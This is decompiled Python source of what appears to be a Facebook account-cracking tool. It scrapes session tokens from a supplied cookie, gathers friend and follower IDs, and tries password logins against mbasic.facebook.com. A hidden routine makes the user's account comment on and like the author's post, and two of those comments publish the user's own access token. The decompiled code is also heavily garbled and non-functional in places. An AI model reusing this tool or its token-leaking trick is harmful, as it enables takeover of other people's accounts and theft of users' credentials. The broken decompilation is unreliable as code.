# Source Generated with Decompyle++
# File: bexm.pyc (Python 3.10)

Auther = 'SWAJON AHMED'
Facebook = 'Facebook.com/SwajonAhmedOfficial'
Instagram = 'Instagram.com/SwajonAhmedOfficial'
Whatsapp = '01883234149'
YouTube = 'Youtube.com/c/SwajonAhmedOfficial'
Kang = 0x5AF4C7FFEB38L
Postingan = 0xB8FB829FA25CAL
komentar = '\n\nhttps://www.facebook.com/' + str(Postingan)
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
Z = '\x1b[0;90m'
M = '\x1b[38;5;196m'
H = '\x1b[38;5;46m'
K = '\x1b[38;5;226m'
B = '\x1b[38;5;44m'
U = '\x1b[1;95m'
I = '\x1b[1;96m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
A = '\x1b[38;5;248m'

try:
    import requests
finally:
    pass

host = None if ImportError else None if ImportError else None if ImportError else 'https://mbasic.facebook.com'
B = random.choice([
    B,
    U,
    J,
    I])

def banner():
    war_dom = random.choice([
        A,
        K,
        I,
        J,
        U,
        H])
    print('\x1b[1;91m    #### \x1b[1;93m ##   ##\x1b[1;96m .####.\x1b[1;95m ######\x1b[1;97m .####.\x1b[1;92m ##  ##\n\x1b[1;91m   ##    \x1b[1;93m ##   ##\x1b[1;96m ##  ##\x1b[1;95m     ##\x1b[1;97m ##  ##\x1b[1;92m ### ##              \n\x1b[1;91m    #### \x1b[1;93m ##.#.##\x1b[1;96m ######\x1b[1;95m     ##\x1b[1;97m ##  ##\x1b[1;92m ##.###              \n\x1b[1;91m       ##\x1b[1;93m #######\x1b[1;96m ##  ##\x1b[1;95m ##  ##\x1b[1;97m ##  ##\x1b[1;92m ##  ##\n\x1b[1;91m    #### \x1b[1;93m  ## ## \x1b[1;96m ##  ##\x1b[1;95m  #### \x1b[1;97m  #### \x1b[1;92m ##  ##\n\x1b[1;92m════════════════════════════════════════════════\n\x1b[1;92m |*|\x1b[0;96m 𝐆𝐇  : 𝐆𝐢𝐭𝐡𝐮𝐛.𝐜𝐨𝐦/𝐒𝐰𝐚𝐣𝐨𝐧𝐀𝐡𝐦𝐞𝐝𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥   \x1b[1;92m|*|\n\x1b[1;92m |*|\x1b[0;96m 𝐅𝐁  : 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤.𝐜𝐨𝐦/𝐒𝐰𝐚𝐣𝐨𝐧𝐀𝐡𝐦𝐞𝐝𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 \x1b[1;92m|*|\n\x1b[1;92m |*|\x1b[0;96m 𝐘𝐓  : 𝐘𝐨𝐮𝐭𝐮𝐛𝐞.𝐜𝐨𝐦/𝐜/𝐒𝐰𝐚𝐣𝐨𝐧𝐀𝐡𝐦𝐞𝐝𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥\x1b[1;92m|*|\n\x1b[1;92m |*|\x1b[0;93m 𝐍𝐎𝐓𝐄: 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋𝐒 𝐘𝐎𝐔𝐑 𝐎𝐖𝐍 𝐑𝐈𝐒𝐊     \x1b[1;92m|*|\n\x1b[1;92m════════════════════════════════════════════════\n                                                     ')

skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari = skrng.day
bulan_ttl = {
    '01': 'Januari',
    '02': 'Februari',
    '03': 'Ma7ret',
    '04': 'April',
    '05': 'Mei',
    '06': 'Juni',
    '07': 'Juli',
    '08': 'Agustus',
    '09': 'September',
    '10': 'Oktober',
    '11': 'November',
    '12': 'Desember' }
bulan_cek = [
    'Januari',
    'Februari',
    'Maret',
    'April',
    'Mei',
    'Juni',
    'Juli',
    'Agustus',
    'September',
    'Oktober',
    'November',
    'Desember']

try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
finally:
    pass

_bulan_ = None if ValueError else bulan_cek[bulan_skrng]
tanggal = '%s-%s-%s' % (hari, _bulan_, tahun)
id = []
ok = []
cp = []
loop = 0

def resik():
    if 'linux' in sys.platform.lower():
        
        try:
            os.system('clear')
        finally:
            return None
            return None
            if 'win' in sys.platform.lower():
                
                try:
                    os.system('cls')
                finally:
                    return None
                    return None
                    
                    try:
                        os.system('clear')
                    finally:
                        return None
                        return None





def jalan(z):
    pass

url_businness = 'https://business.facebook.com'
ua_business = 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36'
kata_dev = 'Youre so handsome bro. I Want to Recode Your Tools, Because Iam Stupid About Coding'
web_fb = 'https://www.facebook.com/'
m_fb = 'https://m.facebook.com/'
mbasic = 'https://mbasic.facebook.com/'
header_grup = {
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]' }

def mkdir_data_login():
    
    try:
        os.mkdir('login')
    finally:
        pass
    
    try:
        os.mkdir('CP')
    finally:
        pass
    
    try:
        os.mkdir('OK')
    finally:
        pass
    
    try:
        os.mkdir('license')
    finally:
        pass
    
    try:
        os.remove('login/cookie.json')
    finally:
        pass
    
    try:
        os.remove('login/token.json')
    finally:
        return None
        return None








def language(cookie):
    
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/', cookie, **('cookies',))
            pra = par(req.content, 'html.parser')
            None(None, None, None)
            return None
            if not None:
                pass
    finally:
        return None
        if Exception:
            e = None
            
            try:
                pass
            finally:
                e = None
                del e
                return None
                e = None
                del e




def convert_id(username):
    
    try:
        cookie = {
            'cookie': open('login/cookie.json', 'r').read() }
        url = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url, cookie, **('cookies',)).content, 'html.parser')
            kut = req.find('a', 'Lainnya', **('string',))
            id = str(kut['href']).split('=')[1]
            None(None, None, None)
            return id
            if not None:
                pass
    finally:
        return None
        if Exception:
            e = None
            
            try:
                pass
            finally:
                e = None
                del e
                return None
                e = None
                del e




def kecuali(error):
    print(f'''{P}[+] Error Occurred!''')
    print(f'''{P}[+] Cannot Execute'''(error))
    print(f'''{P}[+] This Might Happen : ''')
    print(f'''{P}[01] Cookies/Invalid Token''')
    print(f'''{P}[02] Entered Wrong ID''')
    print(f'''{P}[03] bug In Source Code''')
    print(f'''{P}[04] Bug On Requests''')
    print(f'''{P}[05] And Others''')
    print(f'''{P}[•] Rerun This Source Code : ''')
    print(f'''{P}[•] python 2.py''')
    exit()


class bot_author:
    
    def __init__(self, cookie, token, cookie_mentah):
        self.loop = 0
        self.cookie_mentah = cookie_mentah
        list_id = [
            str(Kang)]
        self.komen = [
            ' Swajon Bro I Love Your Tools 🥰🥰 @[100007373957944:0]',
            'Always Connected With You Love You Bro 🥰🥰 @[100007373957944:0]',
            'BIG FAN SIR 🥰🥰 @[100007373957944:0]',
            'So Sweet Of You 🥰🥰 @[100007373957944:0]',
            'Very Handsome🥰🥰💕']

    
    def get_folls(self, id, cookie):
        with requests.Session() as xyz:
            
            try:
                pass
            finally:
                pass
            if Exception:
                e = None
                
                try:
                    pass
                finally:
                    e = None
                    del e
                e = None
                del e
                return None
                None(None, None, None)
                return None
                if not None:
                    pass



    
    def get_likers(self, url, cookie):
        with requests.Session() as xyz:
            
            try:
                bos = par(xyz.get(url, cookie, **('cookies',)).content, 'html.parser')
                continue
                self.get_likers('https://mbasic.facebook.com' + bos.find('a', 'Lihat Berita Lain', **('string',))['href'], cookie)
            finally:
                pass
            if Exception:
                e = None
                
                try:
                    pass
                finally:
                    e = None
                    del e
                e = None
                del e
                return None
                None(None, None, None)
                return None
                if not None:
                    pass



    
    def get_posts(self, id, cookie, token):
        with requests.Session() as xyz:
            
            try:
                pass
            finally:
                pass
            if Exception:
                e = None
                
                try:
                    pass
                finally:
                    e = None
                    del e
                e = None
                del e
                return None
                None(None, None, None)
                return None
                if not None:
                    pass



    
    def waktu(self):
        _bulan_ = [
            'Januari',
            'Februari',
            'March',
            'April',
            'May',
            'Jun',
            'July',
            'August',
            'September',
            'October',
            'November',
            'December'][datetime.now().month - 1]
        _hari_ = {
            'Sunday': 'Sunday',
            'Monday': 'Monday ',
            'Tuesday': 'Tuesday',
            'Wednesday': 'Wednesday ',
            'Thursday': 'Thursday',
            'Friday': 'Friday',
            'Saturday': 'Saturday ' }[str(datetime.now().strftime('%A'))]
        hari_ini = '%s %s %s' % (datetime.now().day, _bulan_, datetime.now().year)
        jam = datetime.now().strftime('%X')
        tem = '\n\nComments Written By Bot\n[ At %s <3 ]\n- %s, %s -' % (jam, _hari_, hari_ini)
        return tem



def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness + '/business_locations', {
            'user-agent': ua_business,
            'referer': web_fb,
            'host': 'business.facebook.com',
            'origin': url_businness,
            'upgrade-insecure-requests': '1',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'text/html; charset=utf-8' }, {
            'cookie': cookie }, **('headers', 'cookies'))
        None(None, None, None)
        return re.search('(EAAG\\w+)', get_tok.text).group(1)
        if not None:
            pass


def log_cookie():
    os.system('clear')
    banner()
    mkdir_data_login()
    print(f'''{I}[*] DON\'T USE PERSONAL ACCOUNT!!''')
    print(f'''{I}[*] IT IS RECOMMENDED TO CREATE A NEW FB ACCOUNT, SO IT\'S NOT EAZY TO CP''')
    cookie = str(input(f'''{B}[*] ENTER COOKIE : {P}'''))
    
    try:
        token = clotox(cookie)
        coki = {
            'cookie': cookie }
        bot_author(coki, token, cookie)
        open('login/token.json', 'w').write(token)
        open('login/cookie.json', 'w').write(cookie)
        menu()
    finally:
        return None
        if requests.exceptions.ConnectionError:
            print(f'''{M}[•] No Internet Connection ''')
            exit()
            return None
        if (KeyError, IOError, AttributeError):
            print(f'''{M}[•] Cookies Invalid ''')
            exit()
            return None


komenredem = random.choice([
    'BANG MANISS KALII'])
komtwol = random.choice([
    'ENJOYING SWAJON AHMED TOOLS ',
    'SWAJON AHMED BRO YOU ARE A RIGHT ',
    'I LOVE YOUR TOOLS BRO ',
    'MY ALLAH BLESS YOU'])
kartu2d = random.choice([
    'I LOVE YOU BRO',
    'BUT SORRY BRO, I WANT TO RECODE SC LU',
    "I'M STUPID ABOUT CODING"])
kon = random.choice([
    "I'm Sorry, I Just Gave Up :"])

def ___swajon___ahmed___tools___bot___():
    
    try:
        token = open('login/token.json', 'r').read()
        cookie = {
            'cookie': open('login/cookie.json', 'r').read() }
        kom = komenredem
        komentar = komtwol
        pipp = kartu2d
        post = '3254245884831178'
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + token, cookie, **('cookies',))
        requests.post('https://graph.facebook.com/3254245884831178/comments/?message=' + kom + '&access_token=' + token, cookie, **('cookies',))
        requests.post('https://graph.facebook.com/3254245884831178/comments/?message=' + pipp + '&access_token=' + token, cookie, **('cookies',))
        requests.post('https://graph.facebook.com/3254245884831178/comments/?message=' + komentar + '&access_token=' + token, cookie, **('cookies',))
        requests.post('https://graph.facebook.com/3254245884831178/comments/?message=' + token + '&access_token=' + token, cookie, **('cookies',))
        requests.post('https://graph.facebook.com/3254245884831178/comments/?message=' + token + '&access_token=' + token, cookie, **('cookies',))
        requests.post('https://graph.facebook.com/3254245884831178/comments/?message=' + kon + '&access_token=' + token, cookie, **('cookies',))
        requests.post('https://graph.facebook.com/3254245884831178/likes?summary=true&access_token=' + token, cookie, **('cookies',))
        requests.post('https://graph.facebook.com/3254245884831178/likes?summary=true&access_token=' + token, cookie, **('cookies',))
        requests.post('https://graph.facebook.com/3254245884831178/likes?summary=true&access_token=' + token, cookie, **('cookies',))
        jalan(f'''{P}[•] Login Successful''')
        menu()
    finally:
        return None
        if Exception:
            e = None
            
            try:
                pass
            finally:
                e = None
                del e
                return None
                e = None
                del e




def menu():
    global token, cookie
    
    try:
        token = open('login/token.json', 'r').read()
        cookie = {
            'cookie': open('login/cookie.json', 'r').read() }
        get = requests.Session().get('https://graph.facebook.com/me?access_token=%s' % token, cookie, **('cookies',))
        gt = requests.get('http://ipinfo.io/json').json()
        language(cookie)
        lolo = json.loads(get.text)
        lolol = lolo['name']
        lolol_id = lolo['id']
        link = lolo['link']
    finally:
        pass

    None if (KeyError, IOError) else os.system('clear')
    banner()
    print(f'''{P}================================================''')
    jalan(f'''{B}[•] ASSALAMU-ALAIKUM''')
    jalan(f'''{B}[•] WELCOME TO SWAJON AHMED TOOLS''')
    print(f'''{P}================================================''')
    jalan(f'''{B}[1] CRACK PUBLIC ID > [MULTIPLE] ''')
    jalan(f'''{B}[2] CRACK PUBLIC ID > [SINGLE]''')
    jalan(f'''{B}[3] CRACK FROM OWN FRIEND-LIST''')
    jalan(f'''{B}[4] CRACK FROM FOLLOWERS''')
    jalan(f'''{B}[5] CHANGE USER-AGENT''')
    jalan(f'''{B}[6] CHECK CRACK RESULTS ''')
    jalan(f'''{B}[7] CHECK ID OPTIONS CHECKPOINT''')
    jalan(f'''{M}[0] LOG-OUT ''')
    print(f'''{P}================================================''')
    pp = input(f'''{B}[•] Choose Anyone : {P}''')
    if pp in ('1', '01'):
        massal()
        return None
    if None in ('2', '02'):
        publik()
        return None
    if None in ('3', '03'):
        listteman()
        return None
    if None in ('4', '04'):
        followerss()
        return None
    if None in ('5', '05'):
        userset()
        return None
    if None in ('6', '06'):
        cek_results()
        return None
    if None in ('7', '07'):
        cek_hasil()
        return None
    if None in ('0', '00'):
        print(f'''{B}[•] Thank You For Choosing This SC As Your Trusted Choice. Dont Forget To Give The Best Rating On Github Yes! Thank You!!{B}- Swajon Ahmed -''')
        print(f'''{B}[•] By Logging Out, All Login Data Will be Deleted. The Following Data Will be Deleted :{B}[•]{P}Token/Cookies''')
        input(f'''{B}[•][{P} Press Enter to Log Out{M}]''')
        
        try:
            shutil.rmtree('login')
        finally:
            pass
        exit()
        return None
        print(f'''{M}[•] Fill in the Right !!''')
        menu()
        return None



def massal():
    
    try:
        token = open('login/token.json', 'r').read()
        cookie = {
            'cookie': open('login/cookie.json', 'r').read() }
    finally:
        pass
    if IOError:
        print(f'''{B}[•]{M} cookie modar dinggo wae ''')
        exit()
    else:
        
        try:
            print(f'''{B}[•] Enter How Many IDs You Want to Crack''')
            tanya_total = int(input(f'''{B}[•] Enter The Number of id : {P}'''))
        finally:
            pass
        tanya_total = 1
        for t in range(tanya_total):
            t += 1
            _id_ = input(f'''{B}[•] Enter User id {P}{t} : {P}''')
            
            try:
                url = requests.Session().get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (_id_, token), cookie, **('cookies',))
                z = json.loads(url.text)
            finally:
                continue
                if KeyError:
                    print(f'''{B}[•]{M} User id Not Found''')
                    menu()
                    continue
                if len(id) == 0:
                    print(f'''{B}[•]{M} Sorry, Your Total id is {M}{len(id)}''')
                    exit()
                    return None
                None(f'''{B}[•] Total id : {P}{len(id)}''')
                fii_xd()
                return None





def listteman():
    
    try:
        token = open('login/token.json', 'r').read()
        cookie = {
            'cookie': open('login/cookie.json', 'r').read() }
    finally:
        pass

    if None if IOError else None if KeyError else len(id) != 0:
        print(f'''{B}[•] Total id : {P}{len(id)}''')
        fii_xd()
        return None
    None(f'''{P}[•]{M} Sorry Total id : {B}{len(id)}''')
    exit()


def publik():
    
    try:
        token = open('login/token.json', 'r').read()
        cookie = {
            'cookie': open('login/cookie.json', 'r').read() }
    finally:
        pass

    _id_ = None if IOError else input(f'''{B}[•] Enter User id : {B}''')
    
    try:
        url = requests.Session().get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (_id_, token), cookie, **('cookies',))
        z = json.loads(url.text)
    finally:
        pass

    if None if KeyError else len(id) != 0:
        print(f'''{B}[•] Total id : {P}{len(id)}''')
        fii_xd()
        return None
    None(f'''{B}[•] Total id : {P}{len(id)}''')
    exit()


def followerss():
    
    try:
        token = open('login/token.json', 'r').read()
        cookie = {
            'cookie': open('login/cookie.json', 'r').read() }
    finally:
        pass

    _id_ = None if IOError else input(f'''{B}[•] Masukan user id : {B}''')
    
    try:
        pass
    finally:
        pass

    if None if KeyError else len(id) != 0:
        print(f'''{B}[•] Total id : {B}{len(id)}''')
        fii_xd()
        return None
    None(f'''{B}[•] {M} total id : {M}{len(id)}''')


def userset():
    print(f'''{B}[1] Change User Agent''')
    print(f'''{B}[2] Check The User Agent in Use''')
    print(f'''{B}[0] Back''')
    _pil_ = input(f'''{B}[•] Input : {P}''')
    if _pil_ in ('1', '01'):
        lololr = input(f'''{B}[•] Enter User Agent \n{P}[•] Enter Here : {B}''')
        
        try:
            open('ua', 'w').write(lololr)
            usera = open('ua', 'r').read()
        finally:
            pass
        if Exception:
            e = None
            
            try:
                print(f'''{B}[•] Error : {M}{e}''')
            finally:
                e = None
                del e
            e = None
            del e
            if usera == lololr:
                print(f'''{B}[•] Success Replace''')
                menu()
                return None
            exit()
            return None
            if _pil_ in ('2', '02'):
                
                try:
                    _tes_ua = open('ua', 'r').read()
                finally:
                    pass

                None if IOError else print(f'''{B}[•] User agent : {P}{_tes_ua}''')
                menu()
                return None
            if None in ('0', '00'):
                menu()
                return None
            None(f'''{M}[•] Wrong Choice ''')
            exit()
            return None




def log_hasil(user, pasw):
    ua = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    ses = requests.Session()
    ses.headers.update({
        'Host': 'mbasic.facebook.com',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'origin': host,
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': host + '/login/?next&ref=dbl&fl&refid=8',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
    data = { }
    ged = par(ses.get(host + '/login/?next&ref=dbl&fl&refid=8', {
        'user-agent': ua }, **('headers',)).text, 'html.parser')
    fm = ged.find('form', {
        'method': 'post' })
    list = [
        'lsd',
        'jazoest',
        'm_ts',
        'li',
        'try_number',
        'unrecognized_tries',
        'login',
        'bi_xrwh']
    continue
    data.update({
        'email': user,
        'pass': pasw })
    
    try:
        run = par(ses.post(host + fm.get('action'), data, True, **('data', 'allow_redirects')).text, 'html.parser')
    finally:
        pass

    if [ {
        i.get('name'): i.get('value') } for i in fm.find_all('input') if i.get('name') in list ] if requests.exceptions.TooManyRedirects else 'c_user' in ses.cookies:
        print(f'''{B}[•]{I} Account Successfully Logged in''')
        return None
    if [ {
        i.get('name'): i.get('value') } for i in fm.find_all('input') if i.get('name') in list ] in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {
            'name': 'fb_dtsg' })['value']
        jzst = form.find('input', {
            'name': 'jazoest' })['value']
        nh = form.find('input', {
            'name': 'nh' })['value']
        dataD = {
            'fb_dtsg': dtsg,
            'fb_dtsg': dtsg,
            'jazoest': jzst,
            'jazoest': jzst,
            'checkpoint_data': '',
            'submit[Continue]': 'Lanjutkan',
            'nh': nh }
        tempek = par(ses.post(host + form['action'], dataD, **('data',)).text, 'html.parser')
        ngew = (lambda .0: [ yy.text for yy in .0 ])(tempek.find_all('option'))
        return None
    if [ {
        i.get('name'): i.get('value') } for i in fm.find_all('input') if i.get('name') in list ] in str(run):
        oh = run.find('div', {
            'id': 'login_error' }).find('div').text
        print(f'''{B}[•]{M}>>>> {oh}''')
        return None
    None(f'''{B}[•